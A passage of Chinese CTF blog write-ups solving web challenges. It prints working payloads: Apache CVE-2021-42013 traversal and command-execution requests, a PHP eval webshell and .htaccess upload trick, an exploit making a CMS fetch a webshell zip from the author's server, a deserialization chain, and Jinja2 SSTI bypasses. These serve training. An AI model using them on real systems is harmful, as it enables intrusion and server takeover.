[{"title":"2022DASCTF MAY 出题人挑战赛 web","url":"/2022/12/06/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web/","content":"Power Cookie\n提示：只有admin才可以获取flag\n\n依据提示可以猜测，本题可能需要通过修改cookie值来获取flag。使用Burp Suite抓包查看Response包发现admin=0于是在Request包中加入Cookie: admin=1\n成功得到flag！\n\n\n本题做题过程初始，博主将Cookie: admin=1插在了请求包的末尾（如下图所示）导致始终无响应，查阅资料发现header匹配到Upgrade时将被终止，调整位置后成功解决，原因庶几如此（请求头 header中传cookie不生效原因）\n\n\n\n魔法浏览器进入后得到提示：\n\n提示：flag.txt为保证文档安全。请使用魔法浏览器来访问。\n\n不明所以，F12查看得到进一步提示，需要let ua = &quot;\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35&quot;结合“使用魔法浏览器”可以猜想到应该将请求报文中的User-Agent修改为其要求的“Magic”内容\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75\n\n发送，成功得到flag\n[看其他师傅的wp时发现可以用console执行js，而不用去utf-8转码，又学到了一点]\n\n\ngetmeF12查看，一脸懵逼除了一行路径pwd:/usr/local/apache2/，得知其是apache，别无其它信息。抓包查看返回包：只能说“黔驴技穷”。之后查找师傅们的wp和网上的各种资料，得知**Apache&#x2F;2.4.50 (Unix)**版本存在任意路径穿越漏洞（这时再回想起一开始的那一行路径，或许也是在提示这一点罢）。[ Apache 远程代码执行（CVE-2021-42013）]直接找到CVE，用poc和exp去打\n\n&#x2F;&#x2F;查看任意文件GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\n\n(若将etc/passwd改为flag，则可读取到flag，不过是假的，我们后面再看)\n\n&#x2F;&#x2F;执行任意命令GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1\n\n我们利用exp和Burp Suite发送命令echo Content-Type: text/plain; echo;ls / //这里的Content-Type: text/plain 规定将文件设置为纯文本的形式\n\n\n从而查看到所有的文件名，在其中发现flag，试图echo;cat /flag读取结果发现为假，只能从其他的文件下手，这里凭运气选一个最奇怪的diajgk，然后一层层查看，最终在第四层发现一个貌似flag的文件，cat读取得到flag\n\n这一题有三个问题在耗费了大量的时间，需要找时间再去理解清晰：1、在找flag的点上存在一些问题，如果要一个个去把文件都试一遍未免过于离谱。在找办法的过程中发现一位师傅通过分析查看日志的办法找到最终真正的flag的路径，不过因为不知道其使用了怎么样的命令而无法复现（点击图片可跳转到这位师傅的博客）2、如何运用该exp去执行更多其他的命令，有何规范？（我自己尝试的cd、tail等均无效）3、echo有什么作用，与分号联合怎样使用？\n\n\nhackme这题不出意外的没有什么思路，发现GOTOLIST是可以点击的链接，里面又有8个链接，一个个点进去，没有头绪，奇怪的是users点进去出现了这样一句：\n\nSorry there doesn’t seem to be a users.go file\n\n又结合最后一个链接——上传一个**.go文件，猜测需要用该链接上传一个名叫users.go**的go文件，然后点击users执行文件。然而博主并不知道什么是go文件，也不知道怎么用，继续懵逼着去翻大佬们的wp，得知可以找到执行命令的go脚本 os&#x2F;exec 执行命令的五种姿势！\n选择执行命令并且能获取结果的办法\npackage mainimport (&quot;fmt&quot;&quot;log&quot;&quot;os/exec&quot;)func main() &#123;    cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)    out, err := cmd.CombinedOutput()    if err != nil &#123;        fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))        log.Fatalf(&quot;cmd.Run() failed with %s\\n&quot;, err)    &#125;    fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))&#125;\n\n发现成功执行了ls /命令且成功找到了藏起来的flag，将cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)更改为cmd := exec.Command(&quot;cat&quot;,&quot;/flag&quot;)成功获取flag！\n\n\nezcms下载文件后，发现有admin.php文件\n得知该网站存在后台，对文件全局搜索“密码”，碰巧发现\n\n\n用admin 123456成功登入后台。逛了一圈，能点的都点了一遍，没发现什么可利用的信息。于是一个个翻看源码，可是博主不够敏锐，没能发现存在着Update.php可以上传文件，后来查看其他大佬的wp才回过神来：嗯，在admin文件夹里，确实应该再仔细看一看。\n\n\n这段代码告诉我们，在这个页面，可以用GET方式传url值，然后该url经sys_auth()函数处理后就会被下载，判断Content-Type值为application/zip就会被解压，然后输出 版本升级成功~\n于是考虑sys_auth()函数作何用处——加密或解密且可判断，当type=0时加密，传入type=1为解密。那么就思路便明确了，我们只需要在vps上部署一个“一句话木马”的压缩文件（.zip），得到webshell.zip的url，然后将该url用源码中的sys_auth()加密，最后以GET方式把加密后的url上传即可，具体实现如下：\n&lt;?phpdefine(&#x27;Mc_Encryption_Key&#x27;,&#x27;GKwHuLj9AOhaxJ2&#x27;);//字符加密、解密 [0为加密，1为解密]function sys_auth($string, $type = 0, $key = &#x27;&#x27;, $expiry = 0) &#123;\tif(is_array($string)) $string = json_encode($string);\tif($type == 1) $string = str_replace(&#x27;-&#x27;,&#x27;+&#x27;,$string);\t$ckey_length = 4;\t$key = md5($key ? $key : Mc_Encryption_Key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = &#x27;&#x27;;\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i &lt;= 255; $i++) &#123;\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t&#125;\tfor($j = $i = 0; $i &lt; 256; $i++) &#123;\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t&#125;\tfor($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t&#125; \tif($type == 1) &#123;\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;\t\t\t$result = substr($result, 26);\t\t\t$json = json_decode($result,1);\t\t\tif(!is_numeric($result) &amp;&amp; $json)&#123;\t\t\t\treturn $json;\t\t\t&#125;else&#123;\t\t\t\treturn $result;\t\t\t&#125;\t\t&#125;\t\treturn &#x27;&#x27;;\t&#125;\treturn str_replace(&#x27;+&#x27;, &#x27;-&#x27;, $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result)));&#125;//以下为利用源码函数进行sys加密$ans=sys_auth(&quot;http://ip.ip.ip.ip/acmd.zip&quot;);//我上传的webshell压缩文件名为acmd.zipvar_dump($ans);?&gt;\n\n利用如上exp得到加密的url：\n\n事实上博主第一次失败了，发现原来代码里还存在着一个全局变量跟踪查找即可以找到define(&#39;Mc_Encryption_Key&#39;,&#39;GKwHuLj9AOhaxJ2&#39;);加上这句定义后成功\n\nstring(79) &quot;498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q&quot;拿到加密url后直接上传：\n成功！接下来，我便开始试图在update.php源码中找到文件下载或解压后所在的位置，此间跟踪了几个类、函数如mczip-&gt;PclZip()结果并没有分析出什么来，只得再去翻看其他师傅的wp，发现他们的后门就在根目录下，于是蚁剑🗡连接，flag还是在根目录下:\n\n\n打开后成功得到flagDASCTF&#123;86527acc-676d-4267-a1a1-b46337a3a2a6&#125;\n\n这题于我而言很扯淡的点就是vps部署和解压目录查找，一开始我脑子有点进淼竟然用本地的PHP study搭建的网站上传压缩包……结果当然就是失败，报错信息是压缩包不zip类型文件我直接傻掉，一直在想如何把压缩包的content type类型调成他要求的zip，完全忽略了他根本进不了我的本地站点…后来部署在vps上成功得以解决；至于第二点仍需要学习，希望多指教~\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022DASCTF Sept X 浙江工业大学秋季挑战赛 web","url":"/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/","content":"hellounser直接可读源码\n&lt;?phpclass A &#123;    public $var;    public function show()&#123;        echo $this-&gt;var;    &#125;    public function __invoke()&#123;        $this-&gt;show();    &#125;&#125;class B&#123;    public $func;    public $arg;        public function show()&#123;        $func = $this-&gt;func;        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123;             die(&#x27;No!No!No!&#x27;);         &#125; else &#123;             include &quot;flag.php&quot;;            //There is no code to print flag in flag.php            $func(&#x27;&#x27;, $this-&gt;arg);         &#125;    &#125;        public function __toString()&#123;        $this-&gt;show();        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;    &#125;        &#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    $aaa = unserialize($_GET[&#x27;pop&#x27;]);    $aaa();&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n审计代码发现需要GET方式传入”pop”，然后经反序列化后被调用。A类中的_invoke()魔术方法能在A类被调用为函数时触发，从而调用show()函数，输出$var，而B类中的_toString()魔术方法能在B类被当作字符串使用时触发，若让$var=B类，则_toString()被触发时调用B的show()函数。查看B类中show()函数，func、arg被绕过后则可包含”flag.php”文件，注释中提到不会输出，便只能依赖$func函数——有两个参数，且能执行任意命令，可利用cretae_function，既绕过了func的匹配，又可以执行（这里需要用&#125;闭合函数）。由此构造如下代码\n$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;&#125;var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;echo urlencode(serialize($a));\n\n传入” cretae_function”作为$函数名，然后将&quot;&#125;var_dump(get_defined_vars());//&quot;传入arg，从而绕过了匹配并执行$func(&#39;&#39;, $this-&gt;arg); ，相当于执行如下代码\ncreate_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)也即---------&gt;cfunction(&quot;&quot;)&#123;&#125;var_dump(get_defined_vars());//&#125;\n\n这里的var_dump()函数可以输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值（其中数组会递归展开值，通过缩进显示其结构）；而get_defined_vars()函数能返回由所有已定义变量所组成的数组，通过这两个函数能看到所有已定义变量。经以上代码执行便可得到序列化$a的url编码，传入后得到发现真正的flag藏在一个叫Tru3flag.php的文件里，因此base64绕过后，用require()函数包含执行[或者cat查看用取反绕过的办法]require(base64_decode(VHJ1M2ZsYWcucGhw));修改后的完整代码如下\nclass A &#123;    public $var;    public function show()&#123;        echo $this-&gt;var;    &#125;    public function __invoke()&#123;        $this-&gt;show();    &#125;&#125;class B&#123;    public $func;    public $arg;        public function show()&#123;        $func = $this-&gt;func;        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123;             die(&#x27;No!No!No!&#x27;);         &#125; else &#123;             include &quot;flag.php&quot;;            //There is no code to print flag in flag.php            $func(&#x27;&#x27;, $this-&gt;arg);         &#125;    &#125;        public function __toString()&#123;        $this-&gt;show();          return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;    &#125; &#125;$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;/*create_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)---------&gt;cfunction(&quot;&quot;)&#123;&#125;var_dump(get_defined_vars());//&#125;*/echo urlencode(serialize($a));?&gt;\n\n得到flag\n\n附经常使用到的魔术方法（来自 php反序列化漏洞之POP链构造）\n__construct()  //当对象创建时触发__destruct()   //当对象销毁时触发__wakeup()     //当使用unserialize时触发__sleep()     //当使用serialize时触发__destruct()  //当对象被销毁时触发__call()      //当对象上下文中调用不可访问的方法时触发__get()       //当访问不可访问或不存在的属性时触发__set()       //当设置不可访问或不存在属性时触发__toString()  //当把类当作字符串使用时触发__invoke()    //当对象调用为函数时触发","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022Dest0g3-520迎新赛-web(1-5题)","url":"/2022/12/06/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web(1-5%E9%A2%98)/","content":"phpdest放出源码：\n&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;    require_once($_GET[&#x27;file&#x27;]);&#125;\n\n这一次是对require_once()函数的考查，其调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，于是我们必须想办法绕过这个机制，从而实现再次包含文件flag.php.\n上一次我们学习到php伪协议，结合下面这个知识点\n/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接\n\n我们就可以用伪协议配合多级符号链接的办法进行绕过，直接构造payload：\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\nGET传参成功转码后成功得到flag.flag = &quot;Dest0g3&#123;ef8f9913-9d91-4c88-9773-0810a40f8ad8&#125;[资料查阅：require_once 绕过不能重复包含文件的限制]\n\nEasyPHP依旧给出源码：\n&lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;    echo $fl4g;&#125;else&#123;    echo &quot;Try harder!&quot;;&#125;set_error_handler(    function() use(&amp;$fl4g) &#123;        print $fl4g;    &#125;);$fl4g .= $dest0g3;?&gt;\n\n易知需要我们POST方式传入ctf，然后拼接在$fl4g后面，而输出$fl4g只能想办法触发set_error_handler()。\n这里我们利用把数组当作字符串进行拼接运算时会报错这一点\nNotice:Array to string conversion//把数组当成了字符串使用，进行 .= 运算时，会自动根据环境需要转换数据类型（echo、print输出数组时也会报这样的信息）\n\n把ctf用POST传入，即payloadctf[]=1\n\n\n成功获得flag.\n\nSimpleRCE源码给出：\n&lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt;\n\n需要我们绕过str_ireplace()函数(不区分大小写地对数组中所有元素进行搜索替换)上传命令，从而实现RCE.\nⅠ、十六进制编码绕过由于过滤了decode，base64编码不能使用，我们想到十六进制转换后绕过。脚本如下：\n&lt;?php$a= &quot;system&quot;;$b=&quot;cat *&quot;;//命令$p=&#x27;sysytem:&#x27;.bin2hex($a).&#x27;&lt;br&gt;command:&#x27;.bin2hex($b);echo $p;?&gt; //sysytem:73797374656d//command:636174202a\n\n构造payload:aaa=hex2bin(&#39;73797374656D&#39;)(hex2bin(&#39;636174202f2a&#39;));//不加;不行成功拿到flag.\nⅡ、无参RCE直接过看到的一种很牛的办法，不过还没有弄清原理。payload：\nPOST：aaa=show_source(next(apache_request_headers()));User-Agent: /flag\n\nⅢ、当然，还有其他绕过方法，如取反绕过：取反基本上用的都是一个不可见字符，不会触发到正则表达式。这里不再赘述，给出脚本：\n&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;\n\n[资料查阅：无字母数字绕过正则表达式总结]\n\nfunny_upload查看页面源代码\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=&quot;javascript&quot;&gt;function Checkfiles()&#123;var fup = document.getElementById(&#x27;file&#x27;);var fileName = fup.value;var ext = fileName.substring(fileName.lastIndexOf(&#x27;.&#x27;) + 1);if(ext == &quot;gif&quot; || ext == &quot;GIF&quot; || ext == &quot;JPEG&quot; || ext == &quot;jpeg&quot; || ext == &quot;jpg&quot; || ext == &quot;JPG&quot; || ext == &quot;png&quot; || ext == &quot;PNG&quot;)&#123;return true;&#125;else&#123;alert(&quot;这个文件不好，我不喜欢&quot;);return false;&#125;&#125;&lt;/script&gt;&lt;form method=&quot;post&quot; onsubmit=&quot;return Checkfiles()&quot; enctype=&quot;multipart/form-data&quot; &gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;    &lt;input  type=&quot;submit&quot; name=&quot;1&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;alert(&#x27;文件内容也改改呗~&#x27;);&lt;/script&gt;\n\n可知前端对文件进行了绕过，且对文件内容也进行了过滤，尝试base64编码绕过：\n&lt;?php @eval($_POST[1]); ?&gt;base64编码——&gt;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n\n\n\n上传成功！接下来的问题是，如何把这个上传的.png文件解析为.php文件。\n了解到.htaccess文件(或者&quot;分布式配置文件&quot;）\n\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\n其中Addtype指令可以将给定的文件拓展名映射到指定的内容类型：\nAddType media-type extension [extension] ... 示例：AddType application/x-httpd-php .gif 将以 gif 为后缀的文件当做 php 解析AddType application/x-httpd-php png  jpg gif将以上的多个后缀都当作php解析。\n\n并且，通过 php_value 来设置 auto_prepend_file 或者 auto_append_file 配置选项包含一些敏感文件，同时在本目录或子目录里需要有可解析的php文件来触发。\n结合以上两个指令，我们可以上传一个.htaccess文件：\nAddtype application/x-httpd-php .jpg#将以 jpg 为后缀的文件当做 php 解析php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=webshell.jpg&quot;#配合php伪协议+包含“函数”实现文件执行 \n\n\n\n修改请求包上传成功。\n按照路径打开webshell.jpg-&gt;当作php解析-&gt;触发php_value auto_append_file指令-&gt;执行源码\n\n\n连接蚁剑，在根目录下找到Flag.\n\n\n[查阅资料：.htaccess的利用方法和技巧]\n\nEasySSTI\n\n上来就让我们登录（截这张图完全因为background好看哈哈哈❤）\n根据题目名称提示，这题考察我们SSTI。补习了一些SSTI的知识后【服务器端模板注入（SSTI）】，先用bp抓包，找注入点：发现在username处有jinja2模板引擎的SSTI漏洞。于是用&#39;&#39;.__class__等进行简单测试，发现_，&#39;，&quot;， ，[都被过滤了，于是用&#123;&#123;().request.args.class&#125;&#125;&amp;class=__class__尝试绕过，结果request也被过滤。（事实上globals，getitem，os，read，popen，pop也都被过滤，但是我还没有测出来）从其他师傅那里piao到小姿势：&#123;&#123;config&#125;&#125;可以用来查看配置信息，通过这个或许能够构造出我要的payload\n&amp;lt;Config &#123;&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: None, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: None, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: None, &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093&#125;&amp;gt;\n\n找到\\，可以利用config|string|list获取以执行命令查看根目录……接续翻查资料了解到：\n1. python下的数据拼接join 方法 拼接字典，主要用于索引上的合并:默认按索引合并，可以合并相同或相似的索引，不管他们有没有重叠列2. &#123;&#123;()|select|string|list&#125;&#125;  or  &#123;&#123;lipsum|select|string|list&#125;&#125;     获取字符列表  3. &#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;命令执行\n\n\n\n由此可以用诸如以下的方式构造我们需要的被“过滤”的关键字：\n#构造po=&quot;pop&quot;     #利用dict()|join拼接得到&#123;% set po=dict(po=a,p=a)|join%&#125; #构造a=(()|select|string|list).pop(24),这里a即下划线_&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125; #构造ini=&quot;__init__&quot;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125; #构造glo=&quot;__globals__&quot;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125; #构造geti=&quot;__getitem__&quot;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125; #构造built=&quot;__builtins__&quot;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125; #构造sub=&quot;__subclasses__&quot;&#123;% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%&#125;#构造chr()函数调用&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;#构造file=&#x27;/flag&#x27;&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;\n\n\n回到这一题，因为空格被过滤，可用%0a换行符绕过。命令执行payload构造过程：\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;                        #pop&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;          #_&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;  #globals&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125; #getitem&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;                  #popen&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;               #readdict(o=a,s=a)|join()                #获取 os(config|string|list)|attr(po)(279)  #获取  /&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;&lt;==&gt;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;\n\n成功构造payload：\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n\n\n修改payload，将ls改为ls /，上述dict拼接办法不能用（也可能是我操作有问题），直接()|select|string|list一个个获取：\n((()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(18),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279))|join()\n\n发现flag后按照上述办法将命令修改为cat 